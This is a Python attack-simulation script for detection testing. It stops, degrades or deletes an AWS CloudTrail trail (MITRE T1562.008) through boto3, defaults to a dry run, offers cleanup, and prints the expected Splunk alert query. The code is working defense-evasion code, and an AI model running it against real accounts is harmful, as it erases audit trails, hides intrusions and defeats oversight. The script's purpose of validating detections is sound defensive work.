#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║              ATTACK SIMULATION — AUTHORIZED USE ONLY                        ║
║  CDET-003: CloudTrail Logging Disabled                                       ║
║  Tactic: Defense Evasion | T1562.008 — Impair Defenses: Disable Cloud Logs   ║
║                                                                              ║
║  !! CRITICAL WARNING !!                                                      ║
║  This script can stop AWS CloudTrail logging, creating an audit gap.         ║
║  ONLY run in an ISOLATED TEST ACCOUNT with EXPLICIT WRITTEN AUTHORIZATION.   ║
║  In production accounts this may violate PCI-DSS, SOC2, HIPAA, FedRAMP.     ║
║  DeleteTrail is IRREVERSIBLE — use ONLY in fully disposable sandbox accounts.║
╚══════════════════════════════════════════════════════════════════════════════╝

Usage:
    # Dry-run all modes (default — prints actions only):
    python simulate.py --trail-name management-events --mode stop_logging
    python simulate.py --trail-name management-events --mode degrade_trail
    python simulate.py --trail-name management-events --mode stop_and_degrade

    # Execute mode (makes real AWS API calls):
    python simulate.py --trail-name management-events --mode stop_logging --execute

    # Execute with cleanup:
    python simulate.py --trail-name management-events --mode stop_logging --execute --cleanup

    # DANGER: DeleteTrail (sandbox only):
    python simulate.py --trail-name management-events --mode delete_trail --execute
"""

import argparse
import json
import logging
import sys
import time
from typing import Optional

import boto3
from botocore.exceptions import ClientError

# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%SZ",
    level=logging.INFO,
    stream=sys.stdout,
)
log = logging.getLogger("cdet003-sim")

VALID_MODES = ["stop_logging", "degrade_trail", "stop_and_degrade", "delete_trail"]


# ---------------------------------------------------------------------------
# Core simulation functions
# ---------------------------------------------------------------------------

def get_trail_info(ct_client, trail_name: str) -> Optional[dict]:
    """Retrieve current trail configuration and status."""
    try:
        trails = ct_client.describe_trails(trailNameList=[trail_name], includeShadowTrails=False)
        if not trails.get("trailList"):
            log.error("Trail '%s' not found", trail_name)
            return None
        trail = trails["trailList"][0]
        status = ct_client.get_trail_status(Name=trail_name)
        trail["IsLogging"] = status.get("IsLogging", False)
        return trail
    except ClientError as exc:
        log.error("Cannot describe trail '%s': %s", trail_name, exc)
        return None


def stop_logging(ct_client, trail_name: str, dry_run: bool) -> bool:
    """
    Stop CloudTrail logging for the specified trail.

    WARNING: This stops all CloudTrail event recording immediately.
    """
    if dry_run:
        log.info("[DRY-RUN] Would call: cloudtrail.stop_logging(Name='%s')", trail_name)
        log.info("[DRY-RUN] Effect: All CloudTrail API event recording stops immediately")
        log.info("[DRY-RUN] CloudTrail event generated: StopLogging")
        return True

    log.warning("=" * 60)
    log.warning("EXECUTING: cloudtrail.stop_logging(Name='%s')", trail_name)
    log.warning("This STOPS CloudTrail logging — creating an audit gap!")
    log.warning("=" * 60)

    try:
        ct_client.stop_logging(Name=trail_name)
        log.info("CloudTrail logging stopped for trail: %s", trail_name)
        log.warning("AUDIT GAP ACTIVE — No CloudTrail events are being recorded")
        return True
    except ClientError as exc:
        log.error("Failed to stop logging for '%s': %s", trail_name, exc)
        return False


def degrade_trail(
    ct_client,
    trail_name: str,
    dry_run: bool,
    original_selectors: Optional[list] = None,
) -> Optional[list]:
    """
    Degrade the trail by disabling management events and global service events.

    WARNING: This removes IAM, STS, KMS events from CloudTrail logging.
    Returns the original event selectors so they can be restored.
    """
    # Capture original config before degrading
    try:
        selectors_resp = ct_client.get_event_selectors(TrailName=trail_name)
        original_selectors = selectors_resp.get("EventSelectors", [])
        log.info("Captured original event selectors for restoration")
    except ClientError as exc:
        log.warning("Could not capture original event selectors: %s", exc)
        original_selectors = []

    degraded_selectors = [
        {
            "ReadWriteType": "All",
            "IncludeManagementEvents": False,
            "DataResources": [],
        }
    ]

    if dry_run:
        log.info("[DRY-RUN] Would call: cloudtrail.put_event_selectors() disabling management events")
        log.info("[DRY-RUN] Would call: cloudtrail.update_trail() disabling global service events")
        log.info("[DRY-RUN] Effect: IAM, STS, KMS, and global events removed from trail")
        log.info("[DRY-RUN] CloudTrail events generated: PutEventSelectors, UpdateTrail")
        return original_selectors

    # WARNING: Disables management event logging (IAM, STS, KMS, etc.)
    log.warning("EXECUTING: cloudtrail.put_event_selectors() — disabling management events for '%s'", trail_name)
    try:
        ct_client.put_event_selectors(
            TrailName=trail_name,
            EventSelectors=degraded_selectors,
        )
        log.info("Management events disabled for trail: %s", trail_name)
    except ClientError as exc:
        log.error("Failed to put event selectors for '%s': %s", trail_name, exc)
        return original_selectors

    # WARNING: Disables global service (IAM) event logging
    log.warning("EXECUTING: cloudtrail.update_trail() — disabling global service events for '%s'", trail_name)
    try:
        ct_client.update_trail(
            Name=trail_name,
            IncludeGlobalServiceEvents=False,
        )
        log.info("Global service events disabled for trail: %s", trail_name)
    except ClientError as exc:
        log.error("Failed to update trail '%s': %s", trail_name, exc)

    return original_selectors


def restore_trail(
    ct_client,
    trail_name: str,
    original_selectors: list,
    dry_run: bool,
) -> None:
    """Restore original trail configuration after degrade_trail simulation."""
    if dry_run:
        log.info("[DRY-RUN] Would restore original event selectors for '%s'", trail_name)
        log.info("[DRY-RUN] Would re-enable global service events")
        return

    log.info("Restoring original event selectors for trail: %s", trail_name)
    try:
        if original_selectors:
            ct_client.put_event_selectors(
                TrailName=trail_name,
                EventSelectors=original_selectors,
            )
        else:
            ct_client.put_event_selectors(
                TrailName=trail_name,
                EventSelectors=[{
                    "ReadWriteType": "All",
                    "IncludeManagementEvents": True,
                    "DataResources": [],
                }],
            )
        log.info("Event selectors restored")
    except ClientError as exc:
        log.error("Failed to restore event selectors: %s", exc)

    try:
        ct_client.update_trail(
            Name=trail_name,
            IncludeGlobalServiceEvents=True,
        )
        log.info("Global service events re-enabled")
    except ClientError as exc:
        log.error("Failed to re-enable global service events: %s", exc)


def start_logging(ct_client, trail_name: str, dry_run: bool) -> None:
    """Restart CloudTrail logging (cleanup after stop_logging)."""
    if dry_run:
        log.info("[DRY-RUN] Would call: cloudtrail.start_logging(Name='%s')", trail_name)
        return

    log.warning("EXECUTING: cloudtrail.start_logging(Name='%s')", trail_name)
    try:
        ct_client.start_logging(Name=trail_name)
        log.info("CloudTrail logging restarted for trail: %s", trail_name)
    except ClientError as exc:
        log.error("Failed to restart logging for '%s': %s", trail_name, exc)


def delete_trail(ct_client, trail_name: str, dry_run: bool) -> None:
    """
    DANGER: Permanently delete a CloudTrail trail.

    WARNING: This is IRREVERSIBLE. The trail must be recreated from scratch.
    Only use in completely disposable sandbox accounts.
    """
    if dry_run:
        log.info("[DRY-RUN] Would call: cloudtrail.delete_trail(Name='%s')", trail_name)
        log.info("[DRY-RUN] Effect: Trail permanently deleted — no CloudTrail events recorded")
        log.info("[DRY-RUN] CloudTrail event generated: DeleteTrail (the last event for this trail)")
        return

    log.warning("=" * 60)
    log.warning("DANGER: EXECUTING cloudtrail.delete_trail(Name='%s')", trail_name)
    log.warning("This PERMANENTLY DELETES the CloudTrail trail!")
    log.warning("This action is IRREVERSIBLE without trail recreation.")
    log.warning("Only proceed if this is a DISPOSABLE SANDBOX ACCOUNT.")
    log.warning("=" * 60)

    # Extra confirmation pause
    time.sleep(5)

    try:
        ct_client.delete_trail(Name=trail_name)
        log.info("CloudTrail trail '%s' has been DELETED", trail_name)
        log.warning("No CloudTrail events are being recorded in this account")
    except ClientError as exc:
        log.error("Failed to delete trail '%s': %s", trail_name, exc)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="CDET-003: Simulate CloudTrail logging disabling (T1562.008)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  stop_logging      — Stops CloudTrail recording immediately (reversible)
  degrade_trail     — Disables management/global events (stealthy, reversible)
  stop_and_degrade  — Combines both techniques
  delete_trail      — PERMANENTLY deletes trail (SANDBOX ONLY, IRREVERSIBLE)

Examples:
  python simulate.py --trail-name management-events --mode stop_logging
  python simulate.py --trail-name management-events --mode degrade_trail --execute --cleanup
  python simulate.py --trail-name management-events --mode stop_and_degrade --execute --cleanup
        """,
    )
    parser.add_argument(
        "--trail-name",
        type=str,
        required=True,
        help="Name or ARN of the CloudTrail trail to target",
    )
    parser.add_argument(
        "--mode",
        type=str,
        choices=VALID_MODES,
        default="stop_logging",
        help="Simulation mode (default: stop_logging)",
    )
    parser.add_argument(
        "--region",
        type=str,
        default="us-east-1",
        help="AWS region where the trail is configured (default: us-east-1)",
    )
    parser.add_argument(
        "--execute",
        action="store_true",
        default=False,
        help="Actually execute AWS API calls. Without this flag, runs in dry-run mode.",
    )
    parser.add_argument(
        "--cleanup",
        action="store_true",
        default=False,
        help="Restore trail to original state after simulation (requires --execute)",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    dry_run = not args.execute

    if dry_run:
        log.info("=" * 70)
        log.info("DRY-RUN MODE — No AWS API calls will be made")
        log.info("Mode: %s | Trail: %s", args.mode, args.trail_name)
        log.info("=" * 70)
    else:
        log.warning("=" * 70)
        log.warning("EXECUTE MODE — REAL AWS API CALLS WILL BE MADE")
        log.warning("Mode: %s | Trail: %s", args.mode, args.trail_name)
        if args.mode == "delete_trail":
            log.warning("DANGER: delete_trail mode selected — this is IRREVERSIBLE")
            log.warning("Ensure this is a DISPOSABLE SANDBOX ACCOUNT")
            time.sleep(5)
        else:
            log.warning("Ensure you are in an authorized isolated test environment")
        log.warning("=" * 70)
        time.sleep(2)

    # Build boto3 session — no hardcoded credentials
    session = boto3.Session(region_name=args.region)
    ct = session.client("cloudtrail")
    sts = session.client("sts")

    # Verify identity
    try:
        identity = sts.get_caller_identity()
        log.info("Running as: %s (Account: %s)", identity["Arn"], identity["Account"])
    except ClientError as exc:
        log.error("Cannot determine caller identity: %s", exc)
        return 1

    # Pre-check trail exists
    if not dry_run:
        trail_info = get_trail_info(ct, args.trail_name)
        if trail_info is None:
            return 1
        log.info(
            "Trail: %s | IsLogging: %s | MultiRegion: %s",
            trail_info.get("Name"),
            trail_info.get("IsLogging"),
            trail_info.get("IsMultiRegionTrail"),
        )

    original_selectors: list = []

    # Execute selected mode
    if args.mode == "stop_logging":
        log.info("Executing mode: stop_logging")
        success = stop_logging(ct, args.trail_name, dry_run)
        if not success:
            return 1
        if args.cleanup:
            log.info("Waiting 30s for CloudTrail event propagation before cleanup...")
            if not dry_run:
                time.sleep(30)
            start_logging(ct, args.trail_name, dry_run)

    elif args.mode == "degrade_trail":
        log.info("Executing mode: degrade_trail")
        original_selectors = degrade_trail(ct, args.trail_name, dry_run) or []
        if args.cleanup:
            log.info("Waiting 30s for CloudTrail event propagation before cleanup...")
            if not dry_run:
                time.sleep(30)
            restore_trail(ct, args.trail_name, original_selectors, dry_run)

    elif args.mode == "stop_and_degrade":
        log.info("Executing mode: stop_and_degrade (combined)")
        success = stop_logging(ct, args.trail_name, dry_run)
        if not success:
            return 1
        original_selectors = degrade_trail(ct, args.trail_name, dry_run) or []
        if args.cleanup:
            log.info("Waiting 30s before cleanup...")
            if not dry_run:
                time.sleep(30)
            restore_trail(ct, args.trail_name, original_selectors, dry_run)
            start_logging(ct, args.trail_name, dry_run)

    elif args.mode == "delete_trail":
        log.info("Executing mode: delete_trail")
        delete_trail(ct, args.trail_name, dry_run)
        if args.cleanup:
            log.warning(
                "Cleanup is not supported for delete_trail mode. "
                "You must recreate the trail manually or via Terraform/CloudFormation."
            )

    log.info("Simulation complete.")
    log.info(
        "Expected CDET-003 alert in Splunk: "
        "index=aws_cloudtrail eventSource=cloudtrail.amazonaws.com "
        "eventName IN (StopLogging, DeleteTrail, UpdateTrail)"
    )

    return 0


if __name__ == "__main__":
    sys.exit(main())
